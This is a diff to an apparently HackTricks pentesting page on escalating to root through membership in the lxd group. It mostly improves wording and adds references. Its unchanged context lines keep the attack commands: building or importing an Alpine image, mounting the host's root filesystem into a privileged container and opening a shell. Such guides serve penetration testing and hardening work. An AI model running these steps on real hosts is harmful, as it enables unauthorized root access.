@@ -2,17 +2,17 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-If you belong to _**lxd**_ **or** _**lxc**_ **group**, you can become root
+Membership in the host's LXD management group (normally _**lxd**_) can provide a path to root by allowing full control of the daemon.<sup>[[1]](#references)</sup>
 
 ## Exploiting without internet
 
 ### Method 1
 
-You can download an alpine image to use with lxd from a trusted repository.
-Canonical publishes daily builds in their site: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
-Just grab both **lxd.tar.xz** and **rootfs.squashfs** from the newest build. (Directory name is the date).
+You can download an Alpine image to use with LXD from a trusted repository.
+Canonical's LXD image server publishes daily builds: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
+Just grab both **lxd.tar.xz** and **rootfs.squashfs** from the newest build (the directory name is the date).<sup>[[8]](#references)</sup>
 
-Alternativelly you can install in your machine this distro builder: [https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder) (follow the instructions of the github):
+Alternatively, you can install distrobuilder on your machine by following the [project instructions](https://github.com/lxc/distrobuilder).<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>
 
 ```bash
 # Install requirements
@@ -37,7 +37,7 @@ wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
 sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
 ```
 
-Upload the files **incus.tar.xz** (**lxd.tar.xz** if you downloaded from Canonical repository) and **rootfs.squashfs**, add the image to the repo and create a container:
+Upload **incus.tar.xz** (**lxd.tar.xz** if you downloaded from the Canonical image server) and **rootfs.squashfs**, then import the image and create a container.<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>
 
 ```bash
 lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
@@ -56,9 +56,9 @@ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=t
 
 > [!CAUTION]
 > If you find this error _**Error: No storage pool found. Please create a new storage pool**_\
-> Run **`lxd init`** and set-up all options on default. Then **repeat** the previous chunk of commands
+> Run **`lxd init`**, set up a default storage pool, then **repeat** the previous chunk of commands.<sup>[[2]](#references)</sup>
 
-Finally you can execute the container and get root:
+Finally, start the container and open a root shell on the host filesystem:<sup>[[1]](#references)[[2]](#references)</sup>
 
 ```bash
 lxc start privesc
@@ -68,7 +68,7 @@ lxc exec privesc /bin/sh
 
 ### Method 2
 
-Build an Alpine image and start it using the flag `security.privileged=true`, forcing the container to interact as root with the host filesystem.
+Build an Alpine image and start it with the flag `security.privileged=true`, which maps container root to host root; mounting `/` then exposes the host filesystem inside the container.<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>
 
 ```bash
 # build a simple alpine image
@@ -90,7 +90,16 @@ lxc init myimage mycontainer -c security.privileged=true
 lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
 ```
 
+## References
+
+- [1] [How to harden security for LXD](https://canonical.com/lxd/docs/latest/howto/security_harden/)
+- [2] [LXD containers and virtual machines](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
+- [3] [How to copy and import images](https://canonical.com/lxd/docs/latest/howto/images_copy/)
+- [4] [distrobuilder](https://github.com/lxc/distrobuilder)
+- [5] [How to build images with distrobuilder](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
+- [6] [Alpine image definition](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
+- [7] [lxd-alpine-builder build script](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
+- [8] [LXD image server](https://images.lxd.canonical.com/)
+- [9] [Type: disk](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
+
 {{#include ../../../banners/hacktricks-training.md}}
-
-
-
